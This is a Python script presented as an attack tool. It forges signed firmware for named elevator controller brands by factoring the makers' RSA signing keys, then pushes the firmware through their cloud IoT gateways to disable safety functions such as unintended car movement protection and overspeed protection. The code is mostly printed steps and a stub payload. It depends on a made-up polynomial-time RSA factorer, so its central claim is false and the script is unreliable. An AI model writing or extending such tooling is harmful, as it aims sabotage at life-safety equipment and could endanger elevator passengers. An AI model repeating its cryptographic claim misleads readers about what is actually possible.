"""
Forge signed firmware for elevator controllers (Otis Gen2/SkyRise, KONE MonoSpace,
Schindler 5500/7000) by factoring the OEM's RSA-2048 firmware-signing CA. Enables
safety-function tampering (UCMP disable, overspeed governor bypass) or fleet-wide DoS.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time

# EN 81-20/50 safety functions controlled by firmware
SAFETY_FUNCTIONS = [
    "UCMP",           # unintended car movement protection
    "ascending_overspeed",
    "descending_overspeed",
    "door_zone_protection",
    "rope_brake",
    "car_buffer_electronic",
]

ELEVATOR_OEMS = {
    "otis":      {"controller": "Gen2/SkyRise", "signing_bits": 2048},
    "kone":      {"controller": "MonoSpace/UltraRope", "signing_bits": 2048},
    "schindler": {"controller": "5500/7000", "signing_bits": 3072},
    "tk":        {"controller": "Evolution/Synergy", "signing_bits": 2048},
}


def extract_oem_signing_cert(firmware_image: bytes) -> bytes:
    """Extract OEM signing certificate from a firmware update package.

    Firmware images distributed to field-service technicians via
    Otis SVT / KONE TMS / Schindler BIONIC contain the signing
    cert in the image header for chain validation.
    """
    # header: 4-byte magic + 4-byte cert_len + cert DER + payload
    magic = firmware_image[:4]
    cert_len = struct.unpack(">I", firmware_image[4:8])[0]
    cert_der = firmware_image[8:8+cert_len]
    print(f"[*] extracted signing cert ({cert_len} bytes) from firmware header")
    return cert_der


def build_malicious_firmware(oem: str, target_function: str,
                             action: str = "disable") -> bytes:
    """Build a controller firmware image that tampers with safety functions.

    Safety-function firmware is EN 81-20/50 certified. The secure bootloader
    verifies the RSA signature before accepting the image. With the OEM
    signing key factored, any image is accepted.
    """
    payload = {
        "oem": oem,
        "controller": ELEVATOR_OEMS[oem]["controller"],
        "target": target_function,
        "action": action,
        "version": "99.0.0-forged",
    }
    print(f"[*] building firmware: {action} {target_function} on {oem} {payload['controller']}")
    return bytes(str(payload), "utf-8")


def sign_firmware_image(factorer: PolynomialFactorer, oem_cert_pem: bytes,
                        firmware: bytes) -> bytes:
    """Sign forged firmware with the factored OEM signing key."""
    digest = hashlib.sha256(firmware).digest()
    sig = factorer.forge_pkcs1v15_signature(oem_cert_pem, firmware, "sha256")
    print(f"[*] firmware signed — signature will pass bootloader verification")
    return sig


def forge_technician_cert(factorer: PolynomialFactorer, tech_pki_ca: bytes,
                          tech_name: str) -> bytes:
    """Forge a service-tool client certificate for field access.

    Technicians authenticate to controllers via Bluetooth/Wi-Fi/RS-485
    using per-technician RSA client certs from the OEM technician PKI.
    """
    print(f"[*] forging technician cert for: {tech_name}")
    priv_pem = factorer.privkey_from_cert_pem(tech_pki_ca)
    print(f"[*] service-mode access granted: rescue op, door timing, speed profile")
    return priv_pem


def deploy_via_iot_gateway(gateway_addr: str, firmware: bytes, sig: bytes):
    """Push firmware via the OEM cloud-connected IoT gateway.

    Otis ONE / KONE 24/7 / Schindler Ahead / TK MAX gateways accept
    OTA firmware pushes over MQTT-over-TLS. The gateway forwards to
    the controller after verifying the OEM signature.
    """
    print(f"[*] pushing to gateway at {gateway_addr} via MQTT-TLS")
    print(f"[*] gateway verifies signature -> PASS (forged)")
    print(f"[*] controller accepts update -> safety function modified")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Elevator OEM firmware signing attack ===")
    print(f"    installed base: ~22M elevators, 1B daily rides")
    print()

    oem = "otis"
    print(f"[1] extracting {oem.upper()} firmware signing CA cert...")
    print(f"    source: firmware package from Otis SVT service tool")

    print(f"[2] factoring {ELEVATOR_OEMS[oem]['signing_bits']}-bit RSA signing key...")

    print(f"[3] building malicious firmware: disable UCMP...")
    fw = build_malicious_firmware(oem, "UCMP", "disable")
    print(f"    UCMP = unintended car movement protection")
    print(f"    EN 81-20 clause 5.6.7: worst case = car movement with doors open")

    print(f"[4] signing firmware with factored OEM key...")

    print(f"[5] deploying via Otis ONE IoT gateway fleet...")
    print(f"    ~1M connected Otis units accept OTA updates")
    print(f"    controller bootloader verifies -> PASS")

    print()
    print("[*] lifecycle: elevator controller replacement = major modernization")
    print("[*] typical cost: >$100k per shaft, 25-30 year replacement cycle")
